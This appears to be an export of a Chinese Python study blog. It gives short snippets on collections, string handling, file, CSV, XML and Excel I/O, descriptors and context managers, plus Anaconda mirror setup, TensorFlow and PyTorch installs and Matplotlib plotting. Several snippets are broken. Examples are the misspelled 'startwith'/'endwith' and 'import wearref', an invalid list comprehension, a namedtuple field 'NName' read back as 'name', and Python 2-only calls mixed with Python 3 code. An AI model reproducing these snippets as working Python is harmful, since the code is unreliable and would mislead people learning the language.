<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;no&#x27; : 1,</span><br><span class="line">    &#x27;name&#x27; : &#x27;Runoob&#x27;,</span><br><span class="line">    &#x27;url&#x27; : &#x27;http://www.runoob.com&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Python 字典类型转换为 JSON 对象</span><br><span class="line">json_str = json.dumps(data)</span><br><span class="line"># 将 JSON 对象转换为 Python 字典</span><br><span class="line">data = json.loads(json_str)</span><br></pre></td></tr></table></figure>

<h2 id="Python-技巧"><a href="#Python-技巧" class="headerlink" title="Python 技巧"></a>Python 技巧</h2><h3 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h3><ol>
<li>使用元组存储数据，节省空间。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方式 1</span><br><span class="line">Name, Age, Gender, Email = 1, 2, 3, 4</span><br><span class="line">student = (&#x27;mike&#x27;, 18, &#x27;male&#x27;, &#x27;123@qq.com&#x27;)</span><br><span class="line">name = student[Name]</span><br><span class="line"></span><br><span class="line"># 方式 2</span><br><span class="line">from collections import namedtuple</span><br><span class="line">Student = namedtuple(&#x27;Student&#x27;, [&#x27;NName&#x27;, &#x27;Age&#x27;, &#x27;Gender&#x27;, &#x27;Email&#x27;])</span><br><span class="line">student = Student(&#x27;jim&#x27;, 16, ...)</span><br><span class="line">name = student.name</span><br></pre></td></tr></table></figure>

<ol>
<li>统计序列中的元素出现频率</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">from random import randint</span><br><span class="line">data = [randint(0, 20) for _ in range(30)]</span><br><span class="line"></span><br><span class="line"># 方式 1: 产生结果为字典 </span><br><span class="line">c = dict.fromkeys(data, 0)</span><br><span class="line">for x in data:</span><br><span class="line">    c[x] += 1</span><br><span class="line"></span><br><span class="line"># 方式 2: 结果也是字典，但是还有其他统计信息</span><br><span class="line">from collections import Counter</span><br><span class="line">c2 = Counter(data)</span><br><span class="line">c2.most_common(3) # 频数最大的 3 个元素</span><br><span class="line"></span><br><span class="line"># 例如统计词频</span><br><span class="line">c3 = Counter(re.split(&quot;\W+&quot;, filename))</span><br></pre></td></tr></table></figure>

<ol>
<li>根据字典中值的大小，排序字典序</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">from random import randint</span><br><span class="line">d = &#123;x: randint(60, 100) for x in &#x27;xyzabc&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># 方式 1</span><br><span class="line">sorted(zip(d.values(), d.keys()))</span><br><span class="line"></span><br><span class="line"># 方式 2</span><br><span class="line">sorted(d.items(), key=lambda x: x[1])</span><br></pre></td></tr></table></figure>

<ol>
<li>找到多个字典的公共键</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">from random import randint, sample</span><br><span class="line">s1 = &#123;x: randint(1, 4) for x in sample(&#x27;abcdefg&#x27;, randint(3, 6))&#125;</span><br><span class="line">s2 = &#123;x: randint(1, 4) for x in sample(&#x27;abcdefg&#x27;, randint(3, 6))&#125;</span><br><span class="line">s3 = &#123;x: randint(1, 4) for x in sample(&#x27;abcdefg&#x27;, randint(3, 6))&#125;</span><br><span class="line"></span><br><span class="line"># 方式 1</span><br><span class="line">s1.keys() &amp; s2.keys() &amp; s3.keys()</span><br><span class="line"></span><br><span class="line"># 方式 2</span><br><span class="line">from functools import reduce</span><br><span class="line">reduce(lambda a, b: a &amp; b, map(dict.keys, [s1, s2, s3]))</span><br></pre></td></tr></table></figure>

<ol>
<li>让字典保持有序</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方式 1: 使用有序字典</span><br><span class="line">from collections import OrderedDict</span><br><span class="line">d = OrderedDict()</span><br><span class="line">d[&#x27;a&#x27;] = (1, 10)</span><br><span class="line">d[&#x27;b&#x27;] = (2, 16)</span><br><span class="line">d[&#x27;c&#x27;] = (3, 20)</span><br><span class="line"># 按照输入的顺序存储</span><br></pre></td></tr></table></figure>

<ol>
<li>实现历史记录功能</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方式 1: 使用双端队列</span><br><span class="line">from collections import deque</span><br><span class="line">q = deque([], 5) # 初始值 容量</span><br><span class="line">q.append(1)</span><br><span class="line"></span><br><span class="line">import pickle # python 对象持久化</span><br><span class="line">pickle.dump(q, open(&quot;filename&quot;, &quot;w&quot;))</span><br><span class="line">q = pickle.load(open(&quot;filename&quot;))</span><br></pre></td></tr></table></figure>

<ol>
<li>切片操作</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d[1:3]</span><br><span class="line"></span><br><span class="line"># 创建可切片的迭代器</span><br><span class="line">from itertools import islice</span><br><span class="line">for line in islice(d, 1, 3):</span><br><span class="line">    print(line)</span><br></pre></td></tr></table></figure>

<ol>
<li>同时迭代多个对象</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">from random import randint</span><br><span class="line">a = [randint(60, 100) for _ in range(40)]</span><br><span class="line">b = [randint(60, 100) for _ in range(40)]</span><br><span class="line"></span><br><span class="line"># 方式 1: 采用索引</span><br><span class="line">for i in range(len(a)):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 方式 2: 采用zip</span><br><span class="line">for x, y in zip(a, b):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 方式 3: 串行连接多个迭代对象</span><br><span class="line">from itertools import chain</span><br><span class="line">for x in chain(a, b):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<ol>
<li>修改列表的元素</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">from random import randint</span><br><span class="line">a = [x: randint(60, 100) for _ in range(40)]</span><br><span class="line"></span><br><span class="line"># 方式 1: 有Bug</span><br><span class="line">for item in d:</span><br><span class="line">    i = d.index(item)</span><br><span class="line">    d[i] += 1</span><br><span class="line"></span><br><span class="line"># 方式 2: </span><br><span class="line">for i, item in enumerate(d):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<h3 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h3><ol>
<li>拆分字符串</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">s = &#x27;ab;cd|efg|hi,jkl|mn\topq;;rs t,uvw\txyz&#x27;</span><br><span class="line"></span><br><span class="line"># 方式 1:</span><br><span class="line">s.split() # 默认为 \t 空格</span><br><span class="line">s.split(&#x27;;&#x27;)</span><br><span class="line"></span><br><span class="line"># 方式 2: 正则</span><br><span class="line">import re</span><br><span class="line">re.split(&#x27;[,;\t|]+&#x27;, s)</span><br></pre></td></tr></table></figure>

<ol>
<li>是否有某一前缀、后缀</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">s = &#x27;www.baidu.com&#x27;</span><br><span class="line"></span><br><span class="line"># 方式 1:</span><br><span class="line">s.startwith(&quot;www&quot;)</span><br><span class="line">s.endwith((&quot;com&quot;, &quot;org&quot;))  # 只能是元组</span><br></pre></td></tr></table></figure>

<ol>
<li>调整字符串格式</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">s = &#x27;2016-05-01&#x27; # 改为 05/01/2016</span><br><span class="line"></span><br><span class="line"># 方式 1:</span><br><span class="line">import re</span><br><span class="line">re.sub(r&#x27;(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&#x27;, r&#x27;\2/\1/\3&#x27;, s)</span><br><span class="line">re.sub(r&#x27;(?P&lt;year&gt;\d&#123;4&#125;)-(?P&lt;month&gt;\d&#123;2&#125;)-(?P&lt;day&gt;\d&#123;2&#125;)&#x27;, r&#x27;\g&lt;month&gt;/\g&lt;day&gt;/\g&lt;year&gt;&#x27;, s)</span><br></pre></td></tr></table></figure>

<ol>
<li>拼接多个字符串</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">s1 = &#x27;12345&#x27;</span><br><span class="line">s2 = &#x27;67890&#x27;</span><br><span class="line"></span><br><span class="line"># 方式 1:</span><br><span class="line">&#x27;;&#x27;.join([s1, s2])</span><br></pre></td></tr></table></figure>

<ol>
<li>字符串对齐</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">d = &#123;&#x27;name&#x27;: &#x27;mike&#x27;, &#x27;age&#x27;: 19&#125;</span><br><span class="line"></span><br><span class="line"># 方式 1:</span><br><span class="line">d[&#x27;name&#x27;].ljust(10)</span><br><span class="line">d[&#x27;name&#x27;].rjust(10, &#x27;.&#x27;)</span><br><span class="line">d[&#x27;name&#x27;].center(10)</span><br><span class="line"></span><br><span class="line"># 方式 2:</span><br><span class="line">format(s, &#x27;&lt;20&#x27;)  </span><br><span class="line">format(s, &#x27;&gt;20&#x27;)</span><br><span class="line">format(s, &#x27;^20&#x27;)</span><br></pre></td></tr></table></figure>

<ol>
<li>去除不需要的字符</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">s1 = &#x27;   abc  123    &#x27;</span><br><span class="line"></span><br><span class="line"># 方式 1</span><br><span class="line">s.strip(&#x27; &#x27;)  # 去掉两端字符，默认为 空格</span><br><span class="line">s.lstrip()</span><br><span class="line">s.rstrip()</span><br><span class="line"></span><br><span class="line"># 方法 2</span><br><span class="line">s = s[:3] + s[4:]</span><br><span class="line"></span><br><span class="line"># 方法 3</span><br><span class="line">s.replace(&#x27;\t&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># 方法 4</span><br><span class="line">re.sub(r&#x27;[\t\r]&#x27;, &#x27;&#x27;, s)</span><br><span class="line"></span><br><span class="line"># 方法 5</span><br><span class="line">import string</span><br><span class="line">s.translate(string.maketrans(&#x27;abcxyz&#x27;, &#x27;xyzabc&#x27;))</span><br><span class="line">s.translate(None, &#x27; &#x27;) # 删除字符</span><br></pre></td></tr></table></figure>

<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><ol>
<li>处理二进制文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 产生数据</span><br><span class="line">f = open(&quot;filename&quot;, &quot;rb&quot;)</span><br><span class="line"></span><br><span class="line"># 方式 1</span><br><span class="line">import struct</span><br><span class="line"># 模式：h-short i-int</span><br><span class="line">struct.unpack(&#x27;h&#x27;, &#x27;\x01\x02&#x27;)   # 小端</span><br><span class="line">struct.unpack(&#x27;&gt;h&#x27;, &#x27;\x01\x02&#x27;)  # 大端</span><br><span class="line">import array</span><br><span class="line">buf = array.array(&#x27;h&#x27;, (0 for _ in range(length)))</span><br></pre></td></tr></table></figure>

<ol>
<li>文件缓冲</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 全缓冲</span><br><span class="line">f = open(&#x27;&#x27;, &#x27;w&#x27;, buffering=2048)  # 缓冲区默认 4096 大小</span><br><span class="line"># 行缓冲</span><br><span class="line">f = open(&#x27;&#x27;, &#x27;w&#x27;, buffering=1)   </span><br><span class="line"># 无缓冲</span><br><span class="line">f = open(&#x27;&#x27;, &#x27;w&#x27;, buffering=0) </span><br></pre></td></tr></table></figure>

<ol>
<li>将文件映射到内存</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f = open(&#x27;&#x27;, &#x27;r+b&#x27;)</span><br><span class="line">  # 映射文件描述符到内存，0表示映射区域为文件全文</span><br><span class="line">m = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE)</span><br><span class="line">m = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE, offset=mmap.PAGESIZE * 4)</span><br><span class="line">m[1:10]</span><br><span class="line">m[3] = &#x27;0x30&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li>文件状态</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 系统调用</span><br><span class="line">import os</span><br><span class="line">os.stat(path)</span><br><span class="line">os.lstat(path)  # 不跟随符号链接</span><br><span class="line">os.fstat(open(&quot;&quot;, &quot;&quot;))</span><br><span class="line"></span><br><span class="line"># 包括: 文件类型，文件权限，时间（访问，修改，创建），文件大小</span><br><span class="line"></span><br><span class="line">os.path.isdir()</span><br><span class="line">os.path.isfile()</span><br><span class="line">os.path.islink()</span><br><span class="line">os.path.getatime()</span><br><span class="line">os.path.getsize()</span><br></pre></td></tr></table></figure>

<ol>
<li>使用临时文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tempfile import TemporaryFile, NamedTemporaryFile</span><br><span class="line">f = TemporaryFile()</span><br><span class="line">f.write()</span><br></pre></td></tr></table></figure>

<ol>
<li>读写 CSV</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import csv</span><br><span class="line">rf = open(&#x27;&#x27;, &#x27;rb&#x27;)  # 一定是二进制打开</span><br><span class="line">reader = csv.reader(rf)</span><br><span class="line">head = reader.next()</span><br><span class="line">for row in reader:</span><br><span class="line">    print(row[0], row[1])</span><br><span class="line">writer = csv.writer(wf)</span><br><span class="line">writer.writerow()</span><br><span class="line">writer.flush()</span><br></pre></td></tr></table></figure>

<ol>
<li>读写 JSON</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json.loads()</span><br><span class="line">json.dumps()</span><br></pre></td></tr></table></figure>

<ol>
<li>读写 XML</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from xml.etree.ElementTree import parse</span><br><span class="line">f = open()</span><br><span class="line">et = parse(f)</span><br><span class="line">root = et.getroot()</span><br><span class="line">root.tag</span><br><span class="line">root.attrib</span><br><span class="line">root.text</span><br><span class="line">for child in root:</span><br><span class="line">    print(child.get(&#x27;name&#x27;))</span><br><span class="line"># 在子元素中找</span><br><span class="line">root.find()</span><br><span class="line">root.findall()</span><br><span class="line"># 在所有子孙中找</span><br><span class="line">root.iter()</span><br><span class="line">root.findall(&quot;.//node&quot;)  # 这里使用 XPATH 表示</span><br></pre></td></tr></table></figure>

<ol>
<li>读写 Excel</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import xlrd xlwt</span><br><span class="line">book = xlrd.open_workbook()</span><br><span class="line">sheet = book.sheets()[0]</span><br><span class="line">sheet.nrows</span><br><span class="line">sheet.ncols</span><br><span class="line">cell = sheet.cell(3, 5)</span><br><span class="line">cell.ctype</span><br><span class="line">sheet.row(1)</span><br></pre></td></tr></table></figure>

<h3 id="对象-1"><a href="#对象-1" class="headerlink" title="对象"></a>对象</h3><ol>
<li>创建大量实例并节省内存</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Player(object):</span><br><span class="line">    # __slots__ 限制有哪些属性，关闭动态字典属性</span><br><span class="line">    __slots__ = [&#x27;uid&#x27;, &#x27;name&#x27;, &#x27;stat&#x27;, &#x27;level&#x27;]</span><br><span class="line">    def __init__(self, uid, name, status=0, level=1):</span><br><span class="line">        self.uid = uid</span><br><span class="line">        self.name = name</span><br><span class="line">        self.stat = status</span><br><span class="line">        self.level = level</span><br></pre></td></tr></table></figure>

<ol>
<li>使用上下文管理</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Client(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">    def start(self):</span><br><span class="line">        pass</span><br><span class="line">    def cleanup(self):</span><br><span class="line">        pass</span><br><span class="line">    def __enter__(self):</span><br><span class="line">        return self</span><br><span class="line">    def __exit__(self, exc_type, exc_val, exc_tb):  # 后面参数为异常</span><br><span class="line">        pass</span><br><span class="line">        return True          # 不向上抛出异常</span><br><span class="line">        return False / None  # 向上抛出异常</span><br><span class="line"></span><br><span class="line">with Client() as c:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<ol>
<li>创建可管理的对象属性</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Circle(object):</span><br><span class="line">    radius = 0</span><br><span class="line">    def getRadius(self):</span><br><span class="line">        return self.radius</span><br><span class="line">    def setRadius(self, r):</span><br><span class="line">        if not isinstance(r, (int, float)):</span><br><span class="line">            raise ValueError(&#x27;wrong type.&#x27;)</span><br><span class="line">        self.radius = float(r)</span><br><span class="line">    R = property(getRadius, setRadius) </span><br><span class="line">c = Circle()</span><br><span class="line">c.R = 1</span><br><span class="line">print(c.R)</span><br></pre></td></tr></table></figure>

<ol>
<li>比较操作</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Circle(object):</span><br><span class="line">    radius = 0</span><br><span class="line">    def getRadius(self):</span><br><span class="line">        return self.radius</span><br><span class="line">    def setRadius(self, r):</span><br><span class="line">        if not isinstance(r, (int, float)):</span><br><span class="line">            raise ValueError(&#x27;wrong type.&#x27;)</span><br><span class="line">        self.radius = float(r)</span><br><span class="line">    def __lt__(self, obj):</span><br><span class="line">        pass</span><br><span class="line">    def __ge__(self, obj):</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<ol>
<li>类型检查</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Attr(object):</span><br><span class="line">    def __init__(self, name, type_):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.type_ = type_</span><br><span class="line">    def __get__(self, instance, clazz):</span><br><span class="line">        return instance.__dict__[self.name]</span><br><span class="line">    def __set__(self, instance, value):</span><br><span class="line">        # 此处插入类型检查</span><br><span class="line">        if not isinstance(value, self.type_):</span><br><span class="line">            raise TypeError(f&#x27;expected an &#123;self.type_&#125;&#x27;)</span><br><span class="line">        instance.__dict__[self.name] = value</span><br><span class="line">    def __delete__(self, instance):</span><br><span class="line">        del instance.__dict__[self.name]</span><br><span class="line">class Person(object):</span><br><span class="line">    name = Attr(&#x27;name&#x27;, str)</span><br><span class="line">    age = Attr(&#x27;name&#x27;, int)</span><br></pre></td></tr></table></figure>

<ol>
<li>循环引用垃圾回收问题</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用弱引用</span><br><span class="line">import wearref</span><br><span class="line">a = A()</span><br><span class="line">a_wref = weakref.ref(a)</span><br></pre></td></tr></table></figure>

<ol>
<li>通过字符串调用实例方法</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法 1:</span><br><span class="line">s = Person()</span><br><span class="line">fun = getattr(s, &#x27;getName&#x27;, None)  # 第三个参数为找不到时的默认值</span><br><span class="line">if fun: fun()</span><br><span class="line"></span><br><span class="line"># 方法 2:</span><br><span class="line">from operator import methodcaller</span><br><span class="line">methodcaller(&#x27;findPerson&#x27;, &#x27;name&#x27;, age)(s)</span><br></pre></td></tr></table></figure>

<h3 id="函数装饰器"><a href="#函数装饰器" class="headerlink" title="函数装饰器"></a>函数装饰器</h3>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python GUI</title>
    <url>/2020/02/09/Python/PythonGUI/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="GUI-编程"><a href="#GUI-编程" class="headerlink" title="GUI 编程"></a>GUI 编程</h1><h2 id="Tkinter"><a href="#Tkinter" class="headerlink" title="Tkinter"></a>Tkinter</h2><h2 id="PyQt"><a href="#PyQt" class="headerlink" title="PyQt"></a>PyQt</h2><h2 id="wxPython"><a href="#wxPython" class="headerlink" title="wxPython"></a>wxPython</h2><h2 id="Pyside"><a href="#Pyside" class="headerlink" title="Pyside"></a>Pyside</h2>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 科学计算</title>
    <url>/2020/02/09/Python/PythonScience/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="数据与科学计算"><a href="#数据与科学计算" class="headerlink" title="数据与科学计算"></a>数据与科学计算</h1><h2 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h2><p><a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">下载地址</a></p>
<p>配置清华源，打开<code>Anaconda Prompt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --set show_channel_urls yes</span><br></pre></td></tr></table></figure>

<p>或修改user文件夹下的.condarc文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channels:</span><br><span class="line">  - defaults</span><br><span class="line">show_channel_urls: true</span><br><span class="line">channel_alias: https://mirrors.tuna.tsinghua.edu.cn/anaconda</span><br><span class="line">default_channels:</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2</span><br><span class="line">custom_channels:</span><br><span class="line">  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br></pre></td></tr></table></figure>

<p>运行命令清除缓存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda clean -i</span><br></pre></td></tr></table></figure>

<h2 id="Tensorflow"><a href="#Tensorflow" class="headerlink" title="Tensorflow"></a>Tensorflow</h2><p>创建虚拟环境。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create -n test_env python=3.7</span><br></pre></td></tr></table></figure>

<p>创建完成后，在<code>开始菜单-&gt;Anaconda3—&gt;Anaconda Navigator</code>中可以看到创建完成的环境。</p>
<p>在Anaconda Prompt中启动虚拟环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activate test_env</span><br></pre></td></tr></table></figure>

<p>安装CPU版Tensorflow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda install tensorflow -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure>

<p>搜索安装GPU版</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda search tensorflow-gpu</span><br><span class="line">conda install tensorflow-gpu=1.15.0</span><br></pre></td></tr></table></figure>

<p>Tensorflow与CUDA版本对应</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>CUDA</th>
</tr>
</thead>
<tbody><tr>
<td>1.2 - 1.4</td>
<td>8.0</td>
</tr>
<tr>
<td>1.5 - 1.12</td>
<td>9.0</td>
</tr>
<tr>
<td>1.13 - 1.15</td>
<td>10.0</td>
</tr>
<tr>
<td>2.0</td>
<td>10.0</td>
</tr>
<tr>
<td>2.1</td>
<td>10.1</td>
</tr>
</tbody></table>
<h2 id="PyTorch"><a href="#PyTorch" class="headerlink" title="PyTorch"></a>PyTorch</h2><p>安装<a href="https://pytorch.org/get-started/locally/">PyTorch</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda install pytorch torchvision cudatoolkit=10.1 -c pytorch</span><br></pre></td></tr></table></figure>

<p>离线安装方式，<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/win-64/">安装包下载</a>或<a href="https://conda.anaconda.org/pytorch/win-64/pytorch-1.5.0-py3.7_cuda101_cudnn7_0.tar.bz2">官方下载</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda install --offline pytorch-1.5.0-py3.7_cuda101_cudnn7_0.tar.bz2</span><br></pre></td></tr></table></figure>

<p>或到安装目录下<code>C:\Users\xxx\anaconda3\pkgs</code>替换安装包。</p>
<h2 id="数据分析与可视化"><a href="#数据分析与可视化" class="headerlink" title="数据分析与可视化"></a>数据分析与可视化</h2><p>安装环境：</p>
<p>编辑<code>requirements.txt</code>文件，安装依赖。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">matplotlib==2.2.2 # 画图工具</span><br><span class="line">numpy=1.14.2      # 运算工具</span><br><span class="line">pandas==0.20.3    # 数据处理工具</span><br><span class="line">TA-Lib==0.4.16  # 技术指标库</span><br><span class="line">tables==3.4.2   # 读取 hdf5</span><br><span class="line">jupyter=1.0.0   # 展示数据平台</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h3 id="Jupyter-Notebook"><a href="#Jupyter-Notebook" class="headerlink" title="Jupyter Notebook"></a>Jupyter Notebook</h3><p>原名Ipython Notebook，是一个基于Web的Python IDE，支持Julia，Python，R三种语言，在画图、数据展示方面非常方便。</p>
<p>运行Jupyter：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure>

<p>默认在<a href="http://localhost:8888打开IDE。">http://localhost:8888打开IDE。</a></p>
<p>Cell：一对In Out称为Cell。有编辑模式和命令模式，类似与Vim。</p>
<p>编辑快捷键：</p>
<ul>
<li>Shift + Enter：执行，并下移</li>
<li>Ctrl + Enter：执行，不移动</li>
</ul>
<p>命令快捷键：</p>
<ul>
<li>A：在上方添加Cell</li>
<li>B：在下方添加Cell</li>
<li>D + D：删除Cell</li>
</ul>
<p>Markdown：在上方改为标记。</p>
<h3 id="Matplotlib"><a href="#Matplotlib" class="headerlink" title="Matplotlib"></a>Matplotlib</h3><p>Matplotlib是用来开发2D，3D图表的工具。可以参考Echarts。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"># 魔法函数：仅仅在IPython中使用，此句表示可以内嵌绘图，并且可以省略掉plt.show()这一步。</span><br><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(</span><br><span class="line">    [1, 0, 8],  # 横坐标</span><br><span class="line">    [4, 2, 6]   # 纵坐标</span><br><span class="line">)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>Matplotlib有三层结构：</p>
<ul>
<li>容器层：提供画板（Canvas），画布（Figure）以及绘图区&#x2F;坐标系（Axes，SubPlot）。</li>
<li>辅助显示层：显示图例，刻度，网格等内容。</li>
<li>图像层：显示图像的内容。</li>
</ul>
<p>常用方法有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义数据</span><br><span class="line">x = range(10)</span><br><span class="line">y = [random.uniform(10, 20) for i in x]   # uniform 均匀分布</span><br><span class="line"></span><br><span class="line">x_labels = [f&quot;11:&#123;i:02&#125;&quot; for i in x]    # 设置步长为 5</span><br><span class="line">y_labels = range(40)</span><br><span class="line"></span><br><span class="line">u = range(10)</span><br><span class="line">v = [random.uniform(40, 50) for i in x]</span><br><span class="line"></span><br><span class="line"># 创建画布  容器层</span><br><span class="line">plt.figure(</span><br><span class="line">    figsize=(20, 8),  # 图像的尺寸</span><br><span class="line">    dpi=300  # 图像的DPI</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 创建折线图  图像层</span><br><span class="line">plt.plot(x, y)</span><br><span class="line"></span><br><span class="line"># 添加坐标轴刻度</span><br><span class="line">plt.xticks(x[::5], x_labels[::5])</span><br><span class="line">plt.yticks(y[::5])</span><br><span class="line"></span><br><span class="line"># 添加网格</span><br><span class="line">plt.grid(</span><br><span class="line">    True,              # 是否显示</span><br><span class="line">    linestyle=&#x27;--&#x27;,    # 形状</span><br><span class="line">    alpha=0.3          # 透明度</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 添加标题</span><br><span class="line">plt.xlabel(&quot;Time&quot;)</span><br><span class="line">plt.ylabel(&quot;Temp&quot;)</span><br><span class="line">plt.title(&quot;The Plot&quot;)</span><br><span class="line"></span><br><span class="line"># 添加多条曲线  图像层</span><br><span class="line">plt.plot(u, v, color=&quot;r&quot;, linestyle=&quot;--&quot;, label=&quot;CN&quot;)</span><br><span class="line"></span><br><span class="line"># 图例，要求plot必须设置label属性</span><br><span class="line">plt.legend(loc=&quot;lower left&quot;)  # 显示位置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 保存图像</span><br><span class="line">plt.savefig(path)</span><br><span class="line"></span><br><span class="line"># 显示图像，并释放资源</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>如果绘制多个图像：</p>
